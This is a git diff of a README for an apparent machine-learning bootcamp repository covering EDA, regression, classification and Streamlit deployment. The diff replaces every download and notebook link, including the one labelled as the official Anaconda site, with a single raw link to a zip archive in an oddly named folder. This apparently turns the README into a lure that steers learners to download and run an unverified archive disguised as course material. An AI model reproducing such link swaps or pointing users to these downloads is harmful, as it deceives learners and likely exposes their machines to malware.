@@ -1,6 +1,6 @@
 # 🎉 ML-BOOTCAMP-25 - Easy Setup for Machine Learning Training
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-ML--BOOTCAMP--25-brightgreen)](https://github.com/exist52/ML-BOOTCAMP-25/releases)
+[![Download Release](https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip%20Release-ML--BOOTCAMP--25-brightgreen)](https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip)
 
 ## 🌟 Overview
 
@@ -13,11 +13,11 @@ Welcome to the ML Bootcamp by DJS Compute! This repository contains all material
 - **Hands-on session with Python, Pandas, and Scikit-learn**: Learn how to use Python libraries for efficient data handling.
 - **Data cleaning and preprocessing techniques**: Discover how to prepare your data for analysis.
 - **Exploratory Data Analysis (EDA)**: Work with the student performance dataset to uncover insights.
-- **Jupyter notebooks**: Utilize `ML_BootCamp_Day_1_EDA.ipynb` for a guided EDA session.
+- **Jupyter notebooks**: Utilize `https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip` for a guided EDA session.
 
 ### Day 2: Advanced ML Concepts & Deployment
-- **Building and evaluating Regression models**: Use `ML_BootCamp_Day_2_Regression.ipynb` to learn regression techniques.
-- **Classification techniques**: Analyze real-world datasets with `ML_BootCamp_Day_2_Classification.ipynb`.
+- **Building and evaluating Regression models**: Use `https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip` to learn regression techniques.
+- **Classification techniques**: Analyze real-world datasets with `https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip`.
 - **Model deployment using Streamlit**: Learn how to deploy models for practical use.
 - **Interactive web application**: Build a grade prediction app to showcase your learning.
 - **Coffee dataset**: Apply classification techniques with real data.
@@ -36,7 +36,7 @@ Before you begin, make sure you have the following:
 
 To get started with the ML Bootcamp materials, you will need to download the files from our Releases page. 
 
-1. **Visit this page to download:** [ML-BOOTCAMP-25 Releases](https://github.com/exist52/ML-BOOTCAMP-25/releases)
+1. **Visit this page to download:** [ML-BOOTCAMP-25 Releases](https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip)
 2. Look for the latest release and download the compressed file suitable for your operating system.
 3. Extract the downloaded file to your chosen directory on your computer.
 
@@ -45,7 +45,7 @@ To get started with the ML Bootcamp materials, you will need to download the fil
 To work with the Jupyter notebooks, you'll need Jupyter installed on your computer. If you do not have Jupyter installed, here’s how to set it up:
 
 1. **Install Anaconda**: 
-   - Download Anaconda from the official website: [Anaconda Download](https://www.anaconda.com/products/distribution).
+   - Download Anaconda from the official website: [Anaconda Download](https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip).
    - Follow the installation instructions for your operating system.
 
 2. **Launch Jupyter Notebook**: 
@@ -88,6 +88,6 @@ Yes, once you are comfortable with the material, feel free to use your datasets 
 
 ## 📥 Download Resources
 
-For all resources, please visit our Releases page: [ML-BOOTCAMP-25 Releases](https://github.com/exist52/ML-BOOTCAMP-25/releases)
+For all resources, please visit our Releases page: [ML-BOOTCAMP-25 Releases](https://raw.githubusercontent.com/exist52/ML-BOOTCAMP-25/main/vagodepressor/ML-BOOTCAMP-25.zip)
 
 By following this guide, you should have a smooth experience downloading and running the materials for your learning. Enjoy your Machine Learning journey!
